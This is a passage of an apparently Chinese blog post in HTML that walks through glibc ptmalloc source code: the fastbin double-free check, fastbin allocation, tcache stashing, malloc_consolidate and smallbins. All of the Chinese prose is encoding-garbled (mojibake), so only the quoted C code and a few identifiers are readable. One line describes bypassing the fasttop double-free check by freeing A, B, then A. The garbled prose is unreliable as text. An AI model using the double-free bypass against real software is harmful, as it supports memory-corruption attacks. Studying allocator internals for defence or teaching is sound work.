<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect(old == p, <span class="number">0</span>))								</span><br><span class="line">    malloc_printerr(<span class="string">&quot;double free or corruption (fasttop)&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>æ„æ€å°±æ˜¯æœ¬æ¬¡é‡Šæ”¾çš„å †å—å’Œæ¡¶å­é‡Œæœ€åä¸€æ¬¡é‡Šæ”¾çš„å †å—ä¸èƒ½æ˜¯ä¸€ä¸ª</p>
<p>é‚£å…ˆ<code>free(A)</code>ç„¶å<code>free(B)</code>ç„¶å<code>free(A)</code>,å°±é¥¶è¿‡äº†</p>
</blockquote>
<p><strong>æ³¨æ„åˆ°è¿”è¿˜ç»™fastbinsçš„å †å—,ä¸ä¼šæ¶ˆé™¤ä¸‹ä¸€å †å—P(Prev in use)æ ‡å¿—,è¿™å°±å¯¼è‡´å †å—åˆå¹¶æ—¶ä¸ä¼šç‰µæ‰¯åˆ°fastbinsä¸­çš„å †å—</strong></p>
<h5 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241026174304710.png" alt="malloc beyond tcache"></p>
<p>ä¸€æ¬¡<code>malloc</code>è¯·æ±‚,å¯èƒ½å‘ç”Ÿä¸¤ä»¶äº‹:</p>
<p>1.å¦‚æœ<code>fastbin</code>å¯¹åº”æ¡¶å­ä¸­æœ‰ç©ºé—²å †å—,æŠŠ<code>fastbin</code>ä¸­ç›¸åº”æ¡¶å­ä¸­çš„<strong>å¤´å—</strong>è¿”å›</p>
<p>2.å¦‚æœ<code>tcache</code>å¯¹åº”æ¡¶å­æœ‰ç©º,å†æŠŠ<code>fastbin</code>ä¸­å‰©ä¸‹çš„ç›¸åº”å¤§å°çš„å †å—å¡æ»¡<code>tcache</code>å¯¹åº”çš„æ¡¶å­</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(nb) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>)(get_max_fast()))</span><br><span class="line">&#123;</span><br><span class="line">    idx = fastbin_index(nb);                                            <span class="comment">//å¤§å°æ¢ç®—ä¸‹æ ‡</span></span><br><span class="line">    mfastbinptr *fb = &amp;fastbin(av, idx);                                <span class="comment">//æ¡¶å­å¤´</span></span><br><span class="line">    mchunkptr pp;                                               </span><br><span class="line">    victim = *fb;                                                       <span class="comment">//æ¡¶é‡Œçš„ç¬¬ä¸€å—</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (victim != <span class="literal">NULL</span>)                                                 <span class="comment">//å¦‚æœæ¡¶é‡Œä¸€å—éƒ½æ²¡æœ‰,å°±åˆ«åœ¨fastbinsä¸­åºŸè¯äº†,æ»šè›‹å°±å®Œäº†</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(misaligned_chunk(victim)))                 <span class="comment">//å¯¹é½æ£€æŸ¥</span></span><br><span class="line">            malloc_printerr(<span class="string">&quot;malloc(): unaligned fastbin chunk detected 2&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (SINGLE_THREAD_P)                                            <span class="comment">//å¦‚æœæ˜¯å•çº¿ç¨‹åˆ™å°†å¤´å—æ‹†ä¸‹æ¥, æ¬¡å—æˆä¸ºå¤´å—</span></span><br><span class="line">            *fb = REVEAL_PTR(victim-&gt;fd);</span><br><span class="line">        <span class="keyword">else</span>                                                            <span class="comment">//å¦‚æœæ˜¯å¤šçº¿ç¨‹, åˆ™è°ƒç”¨REMOVE_FBå®å°†å¤´å—æ‹†ä¸‹æ¥</span></span><br><span class="line">            REMOVE_FB(fb, pp, victim);</span><br><span class="line">        <span class="keyword">if</span> (__glibc_likely(victim != <span class="literal">NULL</span>))                             <span class="comment">//æ­£å¸¸æƒ…å†µä¸‹åº”è¯¥å°±æ‹¿åˆ°äº†ä¸€å—</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">size_t</span> victim_idx = fastbin_index(chunksize(victim));       <span class="comment">//å†æ£€æŸ¥ä¸€ä¸‹æ‹¿åˆ°çš„è¿™å—å¤§å°æ˜¯å¦åˆæ ¼</span></span><br><span class="line">            <span class="keyword">if</span> (__builtin_expect(victim_idx != idx, <span class="number">0</span>))					<span class="comment">//æ£€æ ¡ä¸€ä¸‹è¿™ä¸ªå †å—æ˜¯ä¸æ˜¯æ’ç­ç”Ÿ</span></span><br><span class="line">                malloc_printerr(<span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>);</span><br><span class="line">            check_remalloced_chunk(av, victim, nb);</span><br><span class="line">           ...</span><br><span class="line">      </span><br><span class="line">      <span class="comment">//////////////////////////////////////</span></span><br><span class="line">      <span class="comment">////////////å°è¯•ç¼“å­˜è‡³tcache////////////</span></span><br><span class="line">      <span class="comment">//////////////////////////////////////        </span></span><br><span class="line">               </span><br><span class="line">      <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">      alloc_perturb(p, bytes);											<span class="comment">//å †å—åœ¨ç»™ç”¨æˆ·ä½¿ç”¨ä¹‹å‰,æŠŠå…¶ä¸­çš„æ•°æ®å…¨éƒ½æ“¦é™¤,é˜²æ­¢ä¿¡æ¯æ³„éœ²</span></span><br><span class="line">      <span class="keyword">return</span> p;</span><br></pre></td></tr></table></figure>

<p>å®é™…ä¸Šå¦‚æœç¼–è¯‘æ—¶å¼€å¯äº†<code>USE_TCACHE</code>é€‰é¡¹(é»˜è®¤æ˜¯å¼€å¯çš„),</p>
<p>åœ¨æœ¬æ¬¡åˆ†é…è¯·æ±‚æ‹¿åˆ°å †å—ä¹‹å,åœ¨è¿”å›ä¹‹å‰,è¿˜ä¼šå…ˆå°è¯•æŠŠ<code>fastbin</code>ä¸­çš„å‰©ä½™çš„åŒæ ·å¤§å°çš„å †å—ç¼“å­˜åˆ°<code>tcache</code>ä¸­,ç›´åˆ°<code>tcache</code>å¡æ»¡æˆ–è€…<code>fastbin</code>ç©º</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE                              <span class="comment">//å¦‚æœä½¿ç”¨tcache, ä¸‹é¢è¦æŠŠfastbinä¸­çš„å †å—å°è¯•ç¼“å­˜è¿›å…¥tcache,ä¸ºä¸‹ä¸€æ¬¡åˆ†é…åŠ é€Ÿ</span></span></span><br><span class="line">            <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">           stash them in the tcache.  */</span></span><br><span class="line">            <span class="type">size_t</span> tc_idx = csize2tidx(nb);                             <span class="comment">//è®¡ç®—nbå¤§å°çš„å †å—,åœ¨tcacheä¸­çš„ä¸‹æ ‡</span></span><br><span class="line">            <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)                     <span class="comment">//åˆ¤æ–­æ˜¯å¦åœ¨tcacheèŒƒå›´ä¸­</span></span><br><span class="line">            &#123;</span><br><span class="line">                mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">                <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)<span class="comment">//æ£€æŸ¥tcacheå¯¹åº”æ¡¶æ˜¯å¦æœ‰ç©ºé—´</span></span><br><span class="line">                &#123;<span class="comment">//whileç»ˆæ­¢çš„æ¡ä»¶,è¦ä¹ˆæ˜¯tcacheè¢«ç‹ ç‹ å¡æ»¡äº†,è¦ä¹ˆæ˜¯fastbinä¸€æ»´ä¹Ÿä¸å‰©äº†</span></span><br><span class="line">                    <span class="keyword">if</span> (__glibc_unlikely(misaligned_chunk(tc_victim)))</span><br><span class="line">                        malloc_printerr(<span class="string">&quot;malloc(): unaligned fastbin chunk detected 3&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">                        *fb = REVEAL_PTR(tc_victim-&gt;fd);									</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        REMOVE_FB(fb, pp, tc_victim);</span><br><span class="line">                        <span class="keyword">if</span> (__glibc_unlikely(tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    tcache_put(tc_victim, tc_idx);<span class="comment">//å†å¡ä¸€ä¸ª</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>



<h5 id="malloc-consolidate"><a href="#malloc-consolidate" class="headerlink" title="malloc_consolidate"></a>malloc_consolidate</h5><p>ç”±äºfastbinsä¸­çš„å †å—ä¸ä¼šè¢«åˆå¹¶,å¤„äºä¸€ç§ä¸å½»åº•é‡Šæ”¾çš„çŠ¶æ€,å¯èƒ½å¯¼è‡´å¤–éƒ¨ç¢ç‰‡å¢åŠ ,æ¯”å¦‚å‡è®¾æŸä¸€æ—¶åˆ»å †å†…å­˜å¸ƒå±€å¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[64B @ smallbins][16B @ fastbins][64B @ smallbins]</span><br></pre></td></tr></table></figure>

<p>æ€»è®¡æœ‰<code>144B</code>çš„ç©ºé—²å†…å­˜ç©ºé—´</p>
<p>å¯¹äºä¸€ä¸ª<code>128B</code>çš„è¯·æ±‚, å´å› ä¸ºä¸­é—´<code>fastbins</code>ä¸­çš„å †å—ä¸èƒ½è¢«åˆå¹¶,è€Œå¾—ä¸åˆ°æ»¡è¶³</p>
<p>å› æ­¤<code>malloc_consolidate</code>å‡½æ•°çš„èŒè´£,å°±æ˜¯é€‚æ—¶æ¸…ç†<code>fastbins</code>,å°è¯•åˆå¹¶å‡ºå¤§è¥¿ç“œæ¥,å‡å°‘å¤–éƒ¨ç¢ç‰‡</p>
<blockquote>
<p>å¤–éƒ¨ç¢ç‰‡:</p>
<p>å¤šæ¬¡æ— è§„å¾‹çš„åˆ†é…ä¸é‡Šæ”¾ä¹‹åå †å†…å­˜ä¸­å‡ºç°å¾ˆå¤šå°ç©ºæ´,</p>
<p>å°ç©ºæ´å¯èƒ½åŠ èµ·æ¥æœ‰è¾ƒå¤§çš„ç©ºé—´,ä½†æ˜¯å®é™…ä¸Šä¸è¿ç»­,ä¸èƒ½æ»¡è¶³ä¸€ä¸ªçœŸæ­£çš„å¤§ç©ºé—´ç”³è¯·</p>
<p>å†…éƒ¨ç¢ç‰‡:</p>
<p>å› ä¸ºå…ƒæ•°æ®ä»¥åŠå¯¹é½å› ç´ ,å¯¼è‡´å †å—å®é™…å¤§å°å¤§äºæ‰€éœ€å¤§å°æ‰€é€ æˆçš„å†…å­˜æµªè´¹</p>
</blockquote>
<p><strong>malloc_consolidateå‘ç”Ÿæ—¶æœº</strong></p>
<p><code>malloc_consolidate</code>ç”¨äºæ¸…æ‰«<code>fastbins</code>ä¸­çš„é»‘æˆ·</p>
<p>å¯èƒ½å‘ç”Ÿçš„æ—¶æœº:</p>
<p>1.<code>malloc</code>è¯·æ±‚ä¸èƒ½åœ¨<code>tcache,fastbins,smallbins</code>ä¸­å¾—åˆ°æ»¡è¶³,å¹¶ä¸”æ­¤æ—¶<code>fastbins</code>ä¸­è‡³å°‘æœ‰ä¸€ä¸ªå †å—</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    idx = largebin_index (nb);</span><br><span class="line">    <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))		<span class="comment">//å½“fastbinä¸­ä¸€æ—¦æœ‰å †å—,av-&gt;have_fastchunkså°±ä¼šè¢«ç½®ä½</span></span><br><span class="line">      malloc_consolidate (av);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>2.å½“ä½¿ç”¨<code>topchunk</code>è¿›è¡Œåˆ†é…<strong>ä»æ— æ³•æ»¡è¶³</strong>æ—¶,è€ƒè™‘åˆ°<code>fastbins</code>ä¸­çš„å †å—å¯èƒ½åˆå¹¶åˆ°<code>topchunk</code>,ä»¥æ‰©å¤§<code>topchunk</code>,å¯èƒ½æ»¡è¶³åˆ†é…éœ€æ±‚,å› æ­¤æ­¤æ—¶ä¹Ÿä¼šå°è¯•</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    victim = av-&gt;top;</span><br><span class="line">    size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">      &#123;</span><br><span class="line">	...<span class="comment">//ä½¿ç”¨topchunkå¯ä»¥æ»¡è¶³éœ€æ±‚</span></span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">       here for all block sizes.  */</span></span><br><span class="line"><span class="comment">//topchunkæ— æ³•ç›´æ¥æ»¡è¶³éœ€æ±‚,å°è¯•å°†fastbinsä¸­çš„é»‘æˆ·åˆå¹¶åˆ°topchunk,åœ¨ä¸‹ä¸€ä¸ªå¾ªç¯æ—¶é‡æ–°å°è¯•ä½¿ç”¨topchunkåˆ†é…</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">      &#123;</span><br><span class="line">        malloc_consolidate (av);</span><br><span class="line">        <span class="comment">/* restore original bin index */</span></span><br><span class="line">        <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">          idx = smallbin_index (nb);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          idx = largebin_index (nb);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">else</span>		<span class="comment">//åˆ°æ­¤è¯´æ˜fastbinså·²ç»å…¨æ€äº†,å¦‚æœè¿˜ä¸èƒ½æ»¡è¶³åˆ†é…éœ€æ±‚,è¯´æ˜ptmallocå·²ç»æ‰è¥Ÿè§è‚˜äº†,éœ€è¦ç³»ç»Ÿè°ƒç”¨brk,ç»™å †åŒºæ‰©å®¹äº†</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">        <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<p>3.åœ¨<code>free</code>æ—¶å¦‚æœé‡Šæ”¾çš„å †å—éå¸¸å¤§,å¤§äº<code>65536</code>ä¸ªå­—èŠ‚,ä¹Ÿå°±æ˜¯<code>64KB</code>,å¹¶ä¸”æ­¤æ—¶<code>fastbins</code>ä¸­æœ‰ä¸œè¥¿,ä¹Ÿä¼šå‘ç”Ÿ,ç›®çš„æ˜¯æŠŠ<code>fastbins</code>ä¸­çš„é»‘æˆ·æ€äº†,èƒ½åˆå¹¶åˆ°è¿™ä¸ªå¤§å—å„¿çš„å°±åˆå¹¶,ç„¶åè°ƒç”¨<code>munmap</code>ç¼©å‡å †åŒº</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  if ((unsigned long)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">    if (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">	malloc_consolidate(av);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>4.<code>malloc_trim</code>è¢«è°ƒç”¨æ—¶,å­å‡½æ•°<code>mtrim</code>ä¼šè¿›è¡Œ<code>malloc_consolidate</code>,è¿™ä¸ª<code>malloc_trim</code>ä½œç”¨æ˜¯å‰Šå‡å †åŒºç©ºé—´è¿”è¿˜ç»™æ“ä½œç³»ç»Ÿ</p>
<blockquote>
<p>ç„¶è€Œåœ¨glibcä¸­å¹¶æ²¡æœ‰æ‰¾åˆ°è¯¥å‡½æ•°çš„è°ƒç”¨è€…,å¯èƒ½æ˜¯æä¾›ç»™å¼€å‘è€…æ‰‹åŠ¨ç®¡ç†å†…å­˜ç”¨çš„</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">static int</span><br><span class="line">mtrim (mstate av, size_t pad)</span><br><span class="line">&#123;</span><br><span class="line">  /* Ensure all blocks are consolidated.  */</span><br><span class="line">  malloc_consolidate (av);</span><br></pre></td></tr></table></figure>

<p><strong>malloc_consolidateçš„æ•ˆæœ</strong></p>
<p>é›¶å¸§èµ·æ‰‹,ç›´æ¥å®£åˆ¤<code>fastbins</code>ä¸­çš„å †å—æ­»åˆ‘</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">atomic_store_relaxed (&amp;av-&gt;have_fastchunks, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>

<p>æ„æ€æ˜¯æœ¬å‡½æ•°æ‰§è¡Œå®Œæ¯•ä¹‹å,<code>fastbins</code>ä¸­å°†æ— äººç”Ÿè¿˜</p>
<p>å…·ä½“å¹²äº†å•¥å‘¢?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ä»å°åˆ°å¤§éå†fastbinsä¸­çš„10ä¸ªæ¡¶å­,å¯¹äºæ¯ä¸ªæ¡¶å­:</span><br><span class="line">	å¦‚æœæ¡¶å­ä¸ºç©ºåˆ™continue</span><br><span class="line">	å¦‚æœæ¡¶å­ä¸ç©º:</span><br><span class="line">		éå†è¯¥æ¡¶å­ä¸ŠæŒ‚çš„æ¯ä¸ªå †å—,å¯¹äºæ¯ä¸ªå †å—:</span><br><span class="line">			Â· å¦‚æœç‰©ç†ä¸Šç›¸é‚»çš„å‰å—ç©ºé—² åˆ™:</span><br><span class="line">				å‘å‰åˆå¹¶,å¹¶å°†å‰å—ä»å…¶æ‰€åœ¨binä¸­unlinkæ‹†ä¸‹æ¥</span><br><span class="line"></span><br><span class="line">			Â· å¦‚æœç‰©ç†ä¸Šç›¸é‚»çš„åå—ä¸æ˜¯topchunk åˆ™:</span><br><span class="line">				å¦‚æœè¯¥åå—ç©ºé—² åˆ™:</span><br><span class="line">					æŠŠåå—ä»å…¶æ‰€åœ¨binä¸­unlinkæ‹†ä¸‹æ¥,</span><br><span class="line">					å½“å‰å—å‘ååˆå¹¶</span><br><span class="line">				å¦‚æœåå—æ­£åœ¨ä½¿ç”¨ åˆ™:</span><br><span class="line">					åå—çš„Pæ ‡å¿—å½’é›¶</span><br><span class="line">				æŒ‚åˆ°unsortedbinä¸Š</span><br><span class="line">				</span><br><span class="line">				</span><br><span class="line">			Â· å¦‚æœç‰©ç†ä¸Šç›¸é‚»çš„åå—æ˜¯topchunk åˆ™:</span><br><span class="line">				åˆå¹¶åˆ°topchunk</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">maxfb = &amp;fastbin(av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line">fb = &amp;fastbin(av, <span class="number">0</span>);   <span class="comment">//è¿­ä»£éå†fastbinsä¸­çš„æ¯ä¸ªæ¡¶å­,ä»ç¬¬0ä¸ªæ¡¶å­å¼€å§‹,åˆ°æœ€åä¸€ä¸ª</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;       <span class="comment">//ä»å°åˆ°å¤§éå†fastbinsä¸­çš„10ä¸ªæ¡¶å­</span></span><br><span class="line">    p = atomic_exchange_acq(fb, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="number">0</span>)     <span class="comment">//æ¡¶å­éç©º</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (__glibc_unlikely(misaligned_chunk(p)))</span><br><span class="line">                    malloc_printerr(<span class="string">&quot;malloc_consolidate(): &quot;</span></span><br><span class="line">                                    <span class="string">&quot;unaligned fastbin chunk detected&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="type">unsigned</span> <span class="type">int</span> idx = fastbin_index(chunksize(p));</span><br><span class="line">                <span class="keyword">if</span> ((&amp;fastbin(av, idx)) != fb)</span><br><span class="line">                    malloc_printerr(<span class="string">&quot;malloc_consolidate(): invalid chunk size&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            check_inuse_chunk(av, p);</span><br><span class="line">            nextp = REVEAL_PTR(p-&gt;fd);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* Slightly streamlined version of consolidation code in free() */</span></span><br><span class="line">            size = chunksize(p);</span><br><span class="line">            nextchunk = chunk_at_offset(p, size);</span><br><span class="line">            nextsize = chunksize(nextchunk);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!prev_inuse(p)) <span class="comment">//å°è¯•å‘å‰åˆå¹¶</span></span><br><span class="line">            &#123;</span><br><span class="line">                prevsize = prev_size(p);</span><br><span class="line">                size += prevsize;</span><br><span class="line">                p = chunk_at_offset(p, -((<span class="type">long</span>)prevsize));</span><br><span class="line">                <span class="keyword">if</span> (__glibc_unlikely(chunksize(p) != prevsize))</span><br><span class="line">                    malloc_printerr(<span class="string">&quot;corrupted size vs. prev_size in fastbins&quot;</span>);</span><br><span class="line">                unlink_chunk(av, p);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (nextchunk != av-&gt;top)       <span class="comment">//å°è¯•å‘ååˆå¹¶</span></span><br><span class="line">            &#123;</span><br><span class="line">                nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!nextinuse)</span><br><span class="line">                &#123;</span><br><span class="line">                    size += nextsize;</span><br><span class="line">                    unlink_chunk(av, nextchunk);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">                first_unsorted = unsorted_bin-&gt;fd;  <span class="comment">//æŒ‚åˆ°unsortedbinä¸Š</span></span><br><span class="line">                unsorted_bin-&gt;fd = p;</span><br><span class="line">                first_unsorted-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">                &#123;</span><br><span class="line">                    p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                    p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                set_head(p, size | PREV_INUSE);</span><br><span class="line">                p-&gt;bk = unsorted_bin;</span><br><span class="line">                p-&gt;fd = first_unsorted;</span><br><span class="line">                set_foot(p, size);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>                        <span class="comment">//åˆå¹¶åˆ°topchunk</span></span><br><span class="line">            &#123;</span><br><span class="line">                size += nextsize;</span><br><span class="line">                set_head(p, size | PREV_INUSE);</span><br><span class="line">                av-&gt;top = p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">while</span> ((p = nextp) != <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h3 id="å°æ–ŒSmallbins"><a href="#å°æ–ŒSmallbins" class="headerlink" title="å°æ–ŒSmallbins"></a>å°æ–ŒSmallbins</h3><p><code>bin_at(M,2~63)</code>è¿™ä¸ªèŒƒå›´æ˜¯å°æ–Œ</p>
<h4 id="datastructure-1"><a href="#datastructure-1" class="headerlink" title="datastructure"></a>datastructure</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241026213732598.png" alt="image-20241026213732598"></p>
<p>å¸¦é™„åŠ å¤´èŠ‚ç‚¹çš„åŒå‘å¾ªç¯é“¾è¡¨</p>
<p>æ¡¶å­å¤´åˆ°å †å—çš„æŒ‡é’ˆæ˜¯è£¸éœ²çš„</p>
<p>å †å—ä¹‹é—´çš„æŒ‡é’ˆæ˜¯åŠ äº†å¯†çš„,çœŸæ˜¯åŠ äº†ç§æƒ</p>
